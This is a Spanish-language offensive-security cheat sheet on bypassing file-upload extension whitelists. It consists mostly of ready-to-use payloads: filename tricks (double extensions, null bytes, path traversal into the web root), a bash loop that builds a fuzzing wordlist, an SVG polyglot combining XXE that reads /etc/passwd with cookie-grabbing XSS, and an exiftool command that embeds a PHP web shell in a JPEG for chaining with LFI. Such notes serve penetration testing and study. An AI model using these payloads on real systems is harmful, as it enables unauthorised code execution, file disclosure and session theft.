---
aliases:
tags:
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - "[[File Upload - Vulnerabilidades]]"
---
# File Upload - Bypass de Filtros de Lista Blanca

---

## Cheatsheet

| **Filename payload / acción** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Subir `legit.jpg` → Burp → renombrar a `shell.php` | Bypass de whitelist client-side | Whitelist solo en JS frontend. |
| `shell.php.jpg` | Regex que solo verifica "contiene .jpg", no que termine en `.jpg` | Whitelist con `preg_match('/\.jpg/i')` (sin `$`). |
| `shell.php%00.jpg` | Null byte trunca string post-validación | PHP <5.3 / Java legacy. |
| `shell.phar.jpg` con PHP payload + Content-Type: image/jpeg | Phar wrapper de PHP — algunos servers ejecutan | Backend PHP que registra phar handler. |
| `legit.jpg` + payload PHP en EXIF comment (exiftool) | Whitelist pasa porque es JPEG válido. Combo con LFI ejecuta el PHP del EXIF | Whitelist + magic bytes strict, hay LFI en otro endpoint. |
| `shell.svg` con XXE/XSS payload | Whitelist permite SVG → XSS al renderizar | App permite SVG y lo renderiza. |
| `shell.svg` con `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...&xxe;` | XXE via SVG | App parsea SVG con libxml vulnerable. |
| `shell.svg` con `<image href="x" onerror="...">` | Persistent XSS si el SVG se sirve inline | Avatares/perfiles que renderean SVG inline. |
| Subir imagen que dispare CVE de ImageMagick (TIFF/PDF malicioso) | RCE al procesar la imagen | Backend procesa con ImageMagick vulnerable (ImageTragick CVE-2016-3714). |
| `../../../var/www/html/shell.php` como `filename` | Path traversal escribe fuera del upload dir | Filename concat sin sanitizar. |
| `legit.jpg` upload → response da URL `/uploads/legit.jpg` → tras LFI lee EXIF como PHP | Chain whitelist + LFI = RCE | Combo. |
^fu-whistelist

### Wordlist para fuzzing de whitelist

```bash
# Combina null byte / chars unicode con ext "permitida" al final
for char in '%20' '%0a' '%00' '%0d%0a' '/' '.\\' '.' '…' ':'; do
  for ext in '.php' '.phps' '.phar' '.pht' '.phtml' '.inc'; do
    echo "shell$char$ext.jpg"   >> wordlist.txt
    echo "shell$ext$char.jpg"   >> wordlist.txt
    echo "shell.jpg$char$ext"   >> wordlist.txt
    echo "shell.jpg$ext$char"   >> wordlist.txt
  done
done
wc -l wordlist.txt
```

### SVG polyglot con XXE/XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="0" y="20" font-size="14">&xxe;</text>
  <script type="application/javascript">alert(document.cookie)</script>
</svg>
```

### Inyectar PHP en JPEG real (chain con LFI)

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg
# Subir real.jpg → URL: /uploads/real.jpg
# Si existe LFI: ?file=/uploads/real.jpg → ejecuta el PHP del EXIF
```

---

## Overview

Whitelist = filtro acepta SOLO lista predefinida de ext (`.jpg`, `.pdf`, `.png`). Bypass requiere:

1. **Regex flaws** — falta `$` anchor permite `.php.jpg`.
2. **Null byte** — solo si parser es C-based pre-PHP 5.3.
3. **Polyglots** — archivo que ES válido en formato permitido pero contiene payload (PHP en EXIF, JS en SVG).
4. **Procesamiento del archivo** — atacar la libería que renderiza (ImageMagick, librsvg).
5. **Chain con LFI** — subir JPEG válido con PHP en metadata, ejecutar via LFI.

SVG es el target preferido cuando está en whitelist — XML nativo, permite `<script>` y XXE.

---
